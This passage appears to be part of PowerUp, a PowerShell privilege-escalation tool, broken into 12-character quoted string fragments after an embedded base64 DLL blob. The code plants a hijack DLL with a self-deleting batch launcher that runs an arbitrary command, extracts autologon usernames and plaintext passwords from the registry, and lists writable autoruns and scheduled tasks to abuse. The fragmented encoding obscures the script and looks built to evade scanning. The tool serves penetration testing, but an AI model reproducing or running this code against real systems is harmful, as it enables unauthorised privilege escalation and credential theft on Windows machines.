AAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAABA','QEBAQEBAQEBA','QEBAQEBAQEBA','QEBAQEBAQAAA','AAAAAICAgICA','gICAgICAgICA','gICAgICAgICA','gICAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAABhYmNkZWZ','naGlqa2xtbm9','wcXJzdHV2d3h','5egAAAAAAAEF','CQ0RFRkdISUp','LTE1OT1BRUlN','UVVZXWFlaAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AABAQEBAQEBA','QEBAQEBAQEBA','QEBAQEBAQEBA','QAAAAAAAAICA','gICAgICAgICA','gICAgICAgICA','gICAgICAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAABhYmNkZWZ','naGlqa2xtbm9','wcXJzdHV2d3h','5egAAAAAAAEF','CQ0RFRkdISUp','LTE1OT1BRUlN','UVVZXWFlaAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAGC3AIA','BAAAAAQIECAA','AAACkAwAAYIJ','5giEAAAAAAAA','Apt8AAAAAAAC','hpQAAAAAAAIG','f4PwAAAAAQH6','A/AAAAACoAwA','AwaPaoyAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAIH+AAAAAAA','AQP4AAAAAAAC','1AwAAwaPaoyA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAIH+AAA','AAAAAQf4AAAA','AAAC2AwAAz6L','kohoA5aLools','AAAAAAAAAAAA','AAAAAAAAAAIH','+AAAAAAAAQH6','h/gAAAABRBQA','AUdpe2iAAX9p','q2jIAAAAAAAA','AAAAAAAAAAAA','AAIHT2N7g+QA','AMX6B/gAAAAA','BAAAAFgAAAAI','AAAACAAAAAwA','AAAIAAAAEAAA','AGAAAAAUAAAA','NAAAABgAAAAk','AAAAHAAAADAA','AAAgAAAAMAAA','ACQAAAAwAAAA','KAAAABwAAAAs','AAAAIAAAADAA','AABYAAAANAAA','AFgAAAA8AAAA','CAAAAEAAAAA0','AAAARAAAAEgA','AABIAAAACAAA','AIQAAAA0AAAA','1AAAAAgAAAEE','AAAANAAAAQwA','AAAIAAABQAAA','AEQAAAFIAAAA','NAAAAUwAAAA0','AAABXAAAAFgA','AAFkAAAALAAA','AbAAAAA0AAAB','tAAAAIAAAAHA','AAAAcAAAAcgA','AAAkAAAAGAAA','AFgAAAIAAAAA','KAAAAgQAAAAo','AAACCAAAACQA','AAIMAAAAWAAA','AhAAAAA0AAAC','RAAAAKQAAAJ4','AAAANAAAAoQA','AAAIAAACkAAA','ACwAAAKcAAAA','NAAAAtwAAABE','AAADOAAAAAgA','AANcAAAALAAA','AGAcAAAwAAAA','MAAAACAAAAFR','eAIABAAAAVF4','AgAEAAABUXgC','AAQAAAFReAIA','BAAAAVF4AgAE','AAABUXgCAAQA','AAFReAIABAAA','AVF4AgAEAAAB','UXgCAAQAAAFR','eAIABAAAALgA','AAC4AAABgvgC','AAQAAAFC+AIA','BAAAATM8AgAE','AAABMzwCAAQA','AAEzPAIABAAA','ATM8AgAEAAAB','MzwCAAQAAAEz','PAIABAAAATM8','AgAEAAABMzwC','AAQAAAEzPAIA','BAAAAf39/f39','/f39UvgCAAQA','AAFDPAIABAAA','AUM8AgAEAAAB','QzwCAAQAAAFD','PAIABAAAAUM8','AgAEAAABQzwC','AAQAAAFDPAIA','BAAAA/v///wA','AAADggwCAAQA','AAOKFAIABAAA','AAgAAAAAAAAA','AAAAAAAAAAOS','FAIABAAAAAQA','AAC4AAAABAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAABA','AAO8QAAB0nAA','A8BAAABYRAAB','cmAAAMBEAAE8','RAABglwAAWBE','AAKoSAABklwA','ArBIAAMcTAAC','ElwAAyBMAAAU','UAAC8mAAACBQ','AAFIVAACwlwA','AZBUAAJ0VAAD','4mQAAoBUAAME','VAABcmAAAxBU','AAGcWAABomgA','AaBYAAGUYAAC','4lwAAeBgAAJ0','YAABsmwAAoBg','AAFUZAADclwA','AWBkAANwZAAD','4mQAA3BkAAAA','aAABcmAAAABo','AADMbAAAQmAA','ANBsAAHIbAAB','cmAAAdBsAAPU','bAABcmAAA+Bs','AADUcAADEmwA','AOBwAALYcAAB','EmAAAuBwAADs','dAABEmAAAPB0','AAMEdAABEmAA','AxB0AAP0dAAB','cmAAAAB4AABY','eAABcmAAAMB4','AAHMeAABcmAA','AdB4AAKceAAB','kmAAAqB4AAOE','eAAD4mQAA5B4','AAJMfAAD4mQA','AlB8AACMhAAB','wmAAAQCEAAGY','hAABcmAAAaCE','AADokAACgmAA','APCQAAK8kAAC','8mAAAsCQAAOA','lAAAsmwAA4CU','AAK8nAADMmAA','AsCcAAKYoAAD','omAAAqCgAAJw','pAAD4mAAAnCk','AANQpAAD4mQA','A1CkAAAwqAAD','4mQAADCoAAGI','qAABsmwAAZCo','AAIIqAABsmwA','AhCoAAFQsAAC','4mQAAaCwAABs','tAAAQmQAAVC0','AAK4tAAAcmQA','AsC0AANctAAB','cmAAA2C0AABw','uAAD4mQAALC4','AAGUuAAD4mQA','AaC4AAJIuAAB','cmAAAlC4AAM0','uAAD4mQAA2C4','AABsvAABcmAA','AHC8AACYwAAA','smQAAKDAAAD8','wAABsmwAAQDA','AAPYwAAC8mAA','AADEAADMxAAB','cmAAANDEAAMc','xAABcmQAA4DE','AAAQyAABwmQA','AEDIAACgyAAB','4mQAAMDIAADE','yAAB8mQAAQDI','AAEEyAACAmQA','A0DIAABEzAAC','EmQAAFDMAAJg','zAACkmQAAmDM','AAB80AAC4mQA','AODQAAB41AAD','MmQAAIDUAAGQ','1AAD4mQAAlDY','AAA04AAC8mAA','AEDgAAGc4AAB','cmAAAaDgAAN0','4AAAEmgAA4Dg','AAGw5AAC4mQA','AbDkAAFw7AAA','kmgAAXDsAABY','8AABEmgAAGDw','AALk8AABcmAA','AvDwAAEw9AAB','omgAATD0AAME','/AABwmgAAxD8','AAKJBAACMmgA','ApEEAAMxBAAB','smwAAFEIAADR','CAABsmwAANEI','AAM5CAAD4mQA','A0EIAAKNDAAC','8mAAApEMAAMd','DAAC8mgAAyEM','AAOVDAABsmwA','AGEQAAEpGAAD','cmgAAZEYAAK9','HAAAMmwAAsEc','AAOFHAABsmwA','A5EcAAFNIAAA','smwAAVEgAAHJ','IAABAmwAAdEg','AAKpIAAD4mQA','A2EgAADVLAAB','ImwAAOEsAAHt','LAABsmwAAfEs','AAN1LAABcmAA','A8EsAAJhMAAB','4mwAAmEwAABN','NAAB8mwAAKE0','AAJRNAACMmwA','AsE0AAGBOAAC','wmwAAYE4AAJl','OAABsmwAAsE4','AAORRAAC4mwA','A5FEAANJVAAC','8mwAA1FUAAEB','WAADEmwAAQFY','AAEpXAAC8mwA','AYFcAAEpYAAD','QmwAATFgAAK9','YAABcmAAAsFg','AAM1YAABsmwA','A0FgAAJpbAAD','UmwAAnFsAADJ','cAAD8mwAANFw','AAJJdAAAMnAA','AlF0AABJeAAA','0nAAAFF4AAFR','eAABsmwAAYF4','AAGhgAABEnAA','AaGAAAO1gAAB','cmAAA8GAAAL9','hAABcmAAA3GE','AAEdiAABcmAA','ASGIAAIhiAAB','smwAAoGIAAO5','iAABgnAAAAGM','AAMdjAABonAA','A4GMAAJVkAAB','wnAAAsGQAANZ','kAADUlwAA1mQ','AAPRkAADUlwA','A9GQAAA9lAAD','UlwAAFGUAAC9','lAADUlwAAL2U','AAFNlAADUlwA','AU2UAAGllAAD','UlwAAcGUAAJJ','lAADUlwAAkmU','AALBlAADUlwA','AsGUAAMtlAAD','UlwAAy2UAAOZ','lAADUlwAA5mU','AAARmAADUlwA','ABGYAAB9mAAD','UlwAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAEAAAAAAA','BABgAAAAYAAC','AAAAAAAAAAAA','EAAAAAAABAAI','AAAAwAACAAAA','AAAAAAAAEAAA','AAAABAAkEAAB','IAAAAWPAAAFo','BAADkBAAAAAA','AADxhc3NlbWJ','seSB4bWxucz0','idXJuOnNjaGV','tYXMtbWljcm9','zb2Z0LWNvbTp','hc20udjEiIG1','hbmlmZXN0VmV','yc2lvbj0iMS4','wIj4NCiAgPHR','ydXN0SW5mbyB','4bWxucz0idXJ','uOnNjaGVtYXM','tbWljcm9zb2Z','0LWNvbTphc20','udjMiPg0KICA','gIDxzZWN1cml','0eT4NCiAgICA','gIDxyZXF1ZXN','0ZWRQcml2aWx','lZ2VzPg0KICA','gICAgICA8cmV','xdWVzdGVkRXh','lY3V0aW9uTGV','2ZWwgbGV2ZWw','9ImFzSW52b2t','lciIgdWlBY2N','lc3M9ImZhbHN','lIj48L3JlcXV','lc3RlZEV4ZWN','1dGlvbkxldmV','sPg0KICAgICA','gPC9yZXF1ZXN','0ZWRQcml2aWx','lZ2VzPg0KICA','gIDwvc2VjdXJ','pdHk+DQogIDw','vdHJ1c3RJbmZ','vPg0KPC9hc3N','lbWJseT5QQVB','BRERJTkdYWFB','BRERJTkdQQUR','ESU5HWFhQQUR','ESU5HUEFEREl','OR1hYUEFEREl','OR1BBRERJTkd','YWFBBRERJTkd','QQURESU5HWFh','QQUQAcAAAIAA','AADCiOKJ4ooC','iiKKQopiisKO','4o8Cj4KPoowC','AAAA0AAAAuKD','IoNig6KD4oAi','hGKEooTihSKF','YoWiheKGIoZi','hqKG4ocih2KH','oofihCKIAkAA','AzAAAAKChqKG','wobihwKHIodC','h2KHgoeih8KH','4oQCiCKIQohi','iIKIoojCiOKJ','AokiiUKJYomC','iaKJwoniigKK','IopCimKKgoqi','isKK4osCiyKL','Qotii4KLoovC','i+KIAowijEKM','YoyCjKKMwozi','jQKNIo1CjWKN','go2ijcKN4o4C','jiKOQo5ijoKO','oo7CjuKPAo8i','j0KPYo+Cj6KP','wo/ijAKQIpBC','kGKQgpCikMKQ','4pECkSKRQpFi','kYKRopHCkeKS','ApIikkKSYpKC','kAAAAsAAAFAE','AABCgOKC4oDC','jOKNAo0ijUKN','Yo2CjaKNwo3i','jgKOIo5CjmKO','go6ijsKO4o8C','jyKPQo9ij4KP','oo/Cj+KMApAi','kEKQYpCCkKKQ','wpDikQKRIpFC','kWKRgpGikcKR','4pICkmKSgpKi','ksKS4pMCkyKT','QpNik4KTopPC','k+KQApQilEKU','YpSClKKUwpTi','lQKVIpVClWKV','gpWilcKV4pYC','liKWQpZiloKW','opbCluKXApci','l0KXYpeCl6KV','YpnimmKa4pti','mGKcwpzinQKd','Ip1CnkKsArgi','uEK4YriCuKK4','wrjiuQK5Irli','uYK5ornCueK6','AroiukK6YrqC','uqK64rsCuyK7','Qrtiu4K7orvC','uAK8IryCvAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','A"

    if (','$PSBoundPara','meters[''Arch','itecture'']) ','{
        $T','argetArchite','cture = $Arc','hitecture
  ','  }
    else','if ($Env:PRO','CESSOR_ARCHI','TECTURE -eq ','''AMD64'') {
 ','       $Targ','etArchitectu','re = ''x64''
 ','   }
    els','e {
        ','$TargetArchi','tecture = ''x','86''
    }

 ','   if ($Targ','etArchitectu','re -eq ''x64''',') {
        ','[Byte[]]$Dll','Bytes = [Byt','e[]][Convert',']::FromBase6','4String($Dll','Bytes64)
   ',' }
    else ','{
        [B','yte[]]$DllBy','tes = [Byte[',']][Convert]:',':FromBase64S','tring($DllBy','tes32)
    }','

    if ($P','SBoundParame','ters[''BatPat','h'']) {
     ','   $TargetBa','tPath = $Bat','Path
    }
 ','   else {
  ','      $BaseP','ath = $DllPa','th | Split-P','ath -Parent
','        $Tar','getBatPath =',' "$BasePath\','debug.bat"
 ','   }

    # ','patch in the',' appropriate',' .bat launch','er path
    ','$DllBytes = ','Invoke-Patch','Dll -DllByte','s $DllBytes ','-SearchStrin','g ''debug.bat',''' -ReplaceSt','ring $Target','BatPath

   ',' # build the',' launcher .b','at
    if (T','est-Path $Ta','rgetBatPath)',' { Remove-It','em -Force $T','argetBatPath',' }

    "@ec','ho off" | Ou','t-File -Enco','ding ASCII -','Append $Targ','etBatPath
  ','  "start /b ','$BatCommand"',' | Out-File ','-Encoding AS','CII -Append ','$TargetBatPa','th
    ''star','t /b "" cmd ','/c del "%~f0','"&exit /b'' |',' Out-File -E','ncoding ASCI','I -Append $T','argetBatPath','

    Write-','Verbose ".ba','t launcher w','ritten to: $','TargetBatPat','h"
    Set-C','ontent -Valu','e $DllBytes ','-Encoding By','te -Path $Dl','lPath
    Wr','ite-Verbose ','"$TargetArch','itecture DLL',' Hijacker wr','itten to: $D','llPath"

   ',' $Out = New-','Object PSObj','ect
    $Out',' | Add-Membe','r Noteproper','ty ''DllPath''',' $DllPath
  ','  $Out | Add','-Member Note','property ''Ar','chitecture'' ','$TargetArchi','tecture
    ','$Out | Add-M','ember Notepr','operty ''BatL','auncherPath''',' $TargetBatP','ath
    $Out',' | Add-Membe','r Noteproper','ty ''Command''',' $BatCommand','
    $Out.PS','Object.TypeN','ames.Insert(','0, ''PowerUp.','HijackableDL','L'')
    $Out','
}


#######','############','############','############','############','#
#
# Regist','ry Checks
#
','############','############','############','############','########

fu','nction Get-R','egistryAlway','sInstallElev','ated {
<#
.S','YNOPSIS

Che','cks if any o','f the Always','InstallEleva','ted registry',' keys are se','t.

Author: ','Will Schroed','er (@harmj0y',')  
License:',' BSD 3-Claus','e  
Required',' Dependencie','s: None  

.','DESCRIPTION
','
Returns $Tr','ue if the HK','LM:SOFTWARE\','Policies\Mic','rosoft\Windo','ws\Installer','\AlwaysInsta','llElevated
o','r the HKCU:S','OFTWARE\Poli','cies\Microso','ft\Windows\I','nstaller\Alw','aysInstallEl','evated keys
','are set, $Fa','lse otherwis','e. If one of',' these keys ','are set, the','n all .MSI f','iles run wit','h
elevated p','ermissions, ','regardless o','f current us','er permissio','ns.

.EXAMPL','E

Get-Regis','tryAlwaysIns','tallElevated','

Returns $T','rue if any o','f the Always','InstallEleva','ted registry',' keys are se','t.

.OUTPUTS','

System.Boo','lean

$True ','if RegistryA','lwaysInstall','Elevated is ','set, $False ','otherwise.
#','>

    [Outp','utType(''Syst','em.Boolean'')',']
    [Cmdle','tBinding()]
','    Param()
','
    $OrigEr','ror = $Error','ActionPrefer','ence
    $Er','rorActionPre','ference = ''S','ilentlyConti','nue''

    if',' (Test-Path ','''HKLM:SOFTWA','RE\Policies\','Microsoft\Wi','ndows\Instal','ler'') {

   ','     $HKLMva','l = (Get-Ite','mProperty -P','ath ''HKLM:SO','FTWARE\Polic','ies\Microsof','t\Windows\In','staller'' -Na','me AlwaysIns','tallElevated',' -ErrorActio','n SilentlyCo','ntinue)
    ','    Write-Ve','rbose "HKLMv','al: $($HKLMv','al.AlwaysIns','tallElevated',')"

        ','if ($HKLMval','.AlwaysInsta','llElevated -','and ($HKLMva','l.AlwaysInst','allElevated ','-ne 0)){

  ','          $H','KCUval = (Ge','t-ItemProper','ty -Path ''HK','CU:SOFTWARE\','Policies\Mic','rosoft\Windo','ws\Installer',''' -Name Alwa','ysInstallEle','vated -Error','Action Silen','tlyContinue)','
           ',' Write-Verbo','se "HKCUval:',' $($HKCUval.','AlwaysInstal','lElevated)"
','
           ',' if ($HKCUva','l.AlwaysInst','allElevated ','-and ($HKCUv','al.AlwaysIns','tallElevated',' -ne 0)){
  ','            ','  Write-Verb','ose ''AlwaysI','nstallElevat','ed enabled o','n this machi','ne!''
       ','         $Tr','ue
         ','   }
       ','     else{
 ','            ','   Write-Ver','bose ''Always','InstallEleva','ted not enab','led on this ','machine.''
  ','            ','  $False
   ','         }
 ','       }
   ','     else{
 ','           W','rite-Verbose',' ''AlwaysInst','allElevated ','not enabled ','on this mach','ine.''
      ','      $False','
        }
 ','   }
    els','e{
        W','rite-Verbose',' ''HKLM:SOFTW','ARE\Policies','\Microsoft\W','indows\Insta','ller does no','t exist''
   ','     $False
','    }
    $E','rrorActionPr','eference = $','OrigError
}
','

function G','et-RegistryA','utoLogon {
<','#
.SYNOPSIS
','
Finds any a','utologon cre','dentials lef','t in the reg','istry.

Auth','or: Will Sch','roeder (@har','mj0y)  
Lice','nse: BSD 3-C','lause  
Requ','ired Depende','ncies: None ',' 

.DESCRIPT','ION

Checks ','if any autol','ogon account','s/credential','s are set in',' a number of',' registry lo','cations.
If ','they are, th','e credential','s are extrac','ted and retu','rned as a cu','stom PSObjec','t.

.EXAMPLE','

Get-Regist','ryAutoLogon
','
Finds any a','utologon cre','dentials lef','t in the reg','istry.

.OUT','PUTS

PowerU','p.RegistryAu','toLogon

Cus','tom PSObject',' containing ','autologin cr','edentials fo','und in the r','egistry.

.L','INK

https:/','/github.com/','rapid7/metas','ploit-framew','ork/blob/mas','ter/modules/','post/windows','/gather/cred','entials/wind','ows_autologi','n.rb
#>

   ',' [OutputType','(''PowerUp.Re','gistryAutoLo','gon'')]
    [','CmdletBindin','g()]
    Par','am()

    $A','utoAdminLogo','n = $(Get-It','emProperty -','Path "HKLM:S','OFTWARE\Micr','osoft\Window','s NT\Current','Version\Winl','ogon" -Name ','AutoAdminLog','on -ErrorAct','ion Silently','Continue)
  ','  Write-Verb','ose "AutoAdm','inLogon key:',' $($AutoAdmi','nLogon.AutoA','dminLogon)"
','
    if ($Au','toAdminLogon',' -and ($Auto','AdminLogon.A','utoAdminLogo','n -ne 0)) {
','
        $De','faultDomainN','ame = $(Get-','ItemProperty',' -Path "HKLM',':SOFTWARE\Mi','crosoft\Wind','ows NT\Curre','ntVersion\Wi','nlogon" -Nam','e DefaultDom','ainName -Err','orAction Sil','entlyContinu','e).DefaultDo','mainName
   ','     $Defaul','tUserName = ','$(Get-ItemPr','operty -Path',' "HKLM:SOFTW','ARE\Microsof','t\Windows NT','\CurrentVers','ion\Winlogon','" -Name Defa','ultUserName ','-ErrorAction',' SilentlyCon','tinue).Defau','ltUserName
 ','       $Defa','ultPassword ','= $(Get-Item','Property -Pa','th "HKLM:SOF','TWARE\Micros','oft\Windows ','NT\CurrentVe','rsion\Winlog','on" -Name De','faultPasswor','d -ErrorActi','on SilentlyC','ontinue).Def','aultPassword','
        $Al','tDefaultDoma','inName = $(G','et-ItemPrope','rty -Path "H','KLM:SOFTWARE','\Microsoft\W','indows NT\Cu','rrentVersion','\Winlogon" -','Name AltDefa','ultDomainNam','e -ErrorActi','on SilentlyC','ontinue).Alt','DefaultDomai','nName
      ','  $AltDefaul','tUserName = ','$(Get-ItemPr','operty -Path',' "HKLM:SOFTW','ARE\Microsof','t\Windows NT','\CurrentVers','ion\Winlogon','" -Name AltD','efaultUserNa','me -ErrorAct','ion Silently','Continue).Al','tDefaultUser','Name
       ',' $AltDefault','Password = $','(Get-ItemPro','perty -Path ','"HKLM:SOFTWA','RE\Microsoft','\Windows NT\','CurrentVersi','on\Winlogon"',' -Name AltDe','faultPasswor','d -ErrorActi','on SilentlyC','ontinue).Alt','DefaultPassw','ord

       ',' if ($Defaul','tUserName -o','r $AltDefaul','tUserName) {','
           ',' $Out = New-','Object PSObj','ect
        ','    $Out | A','dd-Member No','teproperty ''','DefaultDomai','nName'' $Defa','ultDomainNam','e
          ','  $Out | Add','-Member Note','property ''De','faultUserNam','e'' $DefaultU','serName
    ','        $Out',' | Add-Membe','r Noteproper','ty ''DefaultP','assword'' $De','faultPasswor','d
          ','  $Out | Add','-Member Note','property ''Al','tDefaultDoma','inName'' $Alt','DefaultDomai','nName
      ','      $Out |',' Add-Member ','Noteproperty',' ''AltDefault','UserName'' $A','ltDefaultUse','rName
      ','      $Out |',' Add-Member ','Noteproperty',' ''AltDefault','Password'' $A','ltDefaultPas','sword
      ','      $Out.P','SObject.Type','Names.Insert','(0, ''PowerUp','.RegistryAut','oLogon'')
   ','         $Ou','t
        }
','    }
}

fun','ction Get-Mo','difiableRegi','stryAutoRun ','{
<#
.SYNOPS','IS

Returns ','any elevated',' system auto','runs in whic','h the curren','t user can
m','odify part o','f the path s','tring.

Auth','or: Will Sch','roeder (@har','mj0y)  
Lice','nse: BSD 3-C','lause  
Requ','ired Depende','ncies: Get-M','odifiablePat','h  

.DESCRI','PTION

Enume','rates a numb','er of autoru','n specificat','ions in HKLM',' and filters',' any
autorun','s through Ge','t-Modifiable','Path, return','ing any file','/config loca','tions
in the',' found path ','strings that',' the current',' user can mo','dify.

.EXAM','PLE

Get-Mod','ifiableRegis','tryAutoRun

','Return vulne','able autorun',' binaries (o','r associated',' configs).

','.OUTPUTS

Po','werUp.Modifi','ableRegistry','AutoRun

Cus','tom PSObject',' containing ','results.
#>
','
    [Diagno','stics.CodeAn','alysis.Suppr','essMessageAt','tribute(''PSS','houldProcess',''', '''')]
    ','[OutputType(','''PowerUp.Mod','ifiableRegis','tryAutoRun'')',']
    [Cmdle','tBinding()]
','    Param()
','
    $Search','Locations = ','@(   "HKLM:\','SOFTWARE\Mic','rosoft\Windo','ws\CurrentVe','rsion\Run",
','            ','            ','    "HKLM:\S','oftware\Micr','osoft\Window','s\CurrentVer','sion\RunOnce','",
         ','            ','       "HKLM',':\SOFTWARE\W','ow6432Node\M','icrosoft\Win','dows\Current','Version\Run"',',
          ','            ','      "HKLM:','\SOFTWARE\Wo','w6432Node\Mi','crosoft\Wind','ows\CurrentV','ersion\RunOn','ce",
       ','            ','         "HK','LM:\SOFTWARE','\Microsoft\W','indows\Curre','ntVersion\Ru','nService",
 ','            ','            ','   "HKLM:\SO','FTWARE\Micro','soft\Windows','\CurrentVers','ion\RunOnceS','ervice",
   ','            ','            ',' "HKLM:\SOFT','WARE\Wow6432','Node\Microso','ft\Windows\C','urrentVersio','n\RunService','",
         ','            ','       "HKLM',':\SOFTWARE\W','ow6432Node\M','icrosoft\Win','dows\Current','Version\RunO','nceService"
','            ','            ',')

    $Orig','Error = $Err','orActionPref','erence
    $','ErrorActionP','reference = ','"SilentlyCon','tinue"

    ','$SearchLocat','ions | Where','-Object { Te','st-Path $_ }',' | ForEach-O','bject {

   ','     $Keys =',' Get-Item -P','ath $_
     ','   $ParentPa','th = $_

   ','     ForEach',' ($Name in $','Keys.GetValu','eNames()) {
','
           ',' $Path = $($','Keys.GetValu','e($Name))

 ','           $','Path | Get-M','odifiablePat','h | ForEach-','Object {
   ','            ',' $Out = New-','Object PSObj','ect
        ','        $Out',' | Add-Membe','r Noteproper','ty ''Key'' "$P','arentPath\$N','ame"
       ','         $Ou','t | Add-Memb','er Noteprope','rty ''Path'' $','Path
       ','         $Ou','t | Add-Memb','er Noteprope','rty ''Modifia','bleFile'' $_
','            ','    $Out | A','dd-Member Al','iasproperty ','Name Key
   ','            ',' $Out.PSObje','ct.TypeNames','.Insert(0, ''','PowerUp.Modi','fiableRegist','ryAutoRun'')
','            ','    $Out
   ','         }
 ','       }
   ',' }

    $Err','orActionPref','erence = $Or','igError
}


','############','############','############','############','########
#
#',' Miscellaneo','us checks
#
','############','############','############','############','########

fu','nction Get-M','odifiableSch','eduledTaskFi','le {
<#
.SYN','OPSIS

Retur','ns scheduled',' tasks where',' the current',' user can mo','dify any fil','e
in the ass','ociated task',' action stri','ng.

Author:',' Will Schroe','der (@harmj0','y)  
License',': BSD 3-Clau','se  
Require','d Dependenci','es: Get-Modi','fiablePath  ','

.DESCRIPTI','ON

Enumerat','es all sched','uled tasks b','y recursivel','y listing "$','($ENV:windir',')\System32\T','asks"
and pa','rses the XML',' specificati','on for each ','task, extrac','ting the com','mand trigger','s.
Each trig','ger string i','s filtered t','hrough Get-M','odifiablePat','h, returning',' any file/co','nfig
locatio','ns in the fo','und path str','ings that th','e current us','er can modif','y.

.EXAMPLE','

Get-Modifi','ableSchedule','dTaskFile

R','eturn schedu','led tasks wi','th modifiabl','e command st','rings.

.OUT','PUTS

PowerU','p.Modifiable','ScheduledTas','kFile

Custo','m PSObject c','ontaining re','sults.
#>

 ','   [Diagnost','ics.CodeAnal','ysis.Suppres','sMessageAttr','ibute(''PSSho','uldProcess'',',' '''')]
    [O','utputType(''P','owerUp.Modif','iableSchedul','edTaskFile'')',']
    [Cmdle','tBinding()]
','    Param()
','
    $OrigEr','ror = $Error','ActionPrefer','ence
    $Er','rorActionPre','ference = "S','ilentlyConti','nue"

    $P','ath = "$($EN','V:windir)\Sy','stem32\Tasks','"

    # rec','ursively enu','merate all s','chtask .xmls','
    Get-Chi','ldItem -Path',' $Path -Recu','rse | Where-','Object { -no','t $_.PSIsCon','tainer } | F','orEach-Objec','t {
        ','try {
      ','      $TaskN','ame = $_.Nam','e
          ','  $TaskXML =',' [xml] (Get-','Content $_.F','ullName)
   ','         if ','($TaskXML.Ta','sk.Triggers)',' {

        ','        $Tas','kTrigger = $','TaskXML.Task','.Triggers.Ou','terXML

    ','            ','# check scht','ask command
','            ','    $TaskXML','.Task.Action','s.Exec.Comma','nd | Get-Mod','ifiablePath ','| ForEach-Ob','ject {
     ','            ','   $Out = Ne','w-Object PSO','bject
      ','            ','  $Out | Add','-Member Note','property ''Ta','skName'' $Tas','kName
      ','            ','  $Out | Add','-Member Note','property ''Ta','skFilePath'' ','$_
         ','           $','Out | Add-Me','mber Notepro','perty ''TaskT','rigger'' $Tas','kTrigger
   ','            ','     $Out | ','Add-Member A','liasproperty',' Name TaskNa','me
         ','           $','Out.PSObject','.TypeNames.I','nsert(0, ''Po','werUp.Modifi','ableSchedule','dTaskFile'')
','            ','        $Out','
           ','     }

    ','            ','# check scht','ask argument','s
          ','      $TaskX','ML.Task.Acti','ons.Exec.Arg','uments | Get','-ModifiableP','ath | ForEac','h-Object {
 ','            ','       $Out ','= New-Object',' PSObject
  ','            ','      $Out |',' Add-Member ','Noteproperty',' ''TaskName'' ','$TaskName
  ','            ','      $Out |',' Add-Member ','Noteproperty',' ''TaskFilePa','th'' $_
     ','            ','   $Out | Ad','d-Member Not','eproperty ''T','askTrigger'' ','$TaskTrigger','
           ','         $Ou','t | Add-Memb','er Aliasprop','erty Name Ta','skName
     ','            ','   $Out.PSOb','ject.TypeNam','es.Insert(0,',' ''PowerUp.Mo','difiableSche','duledTaskFil','e'')
        ','            ','$Out
       ','         }
 ','           }','
        }
 ','       catch',' {
         ','   Write-Ver','bose "Error:',' $_"
       ',' }
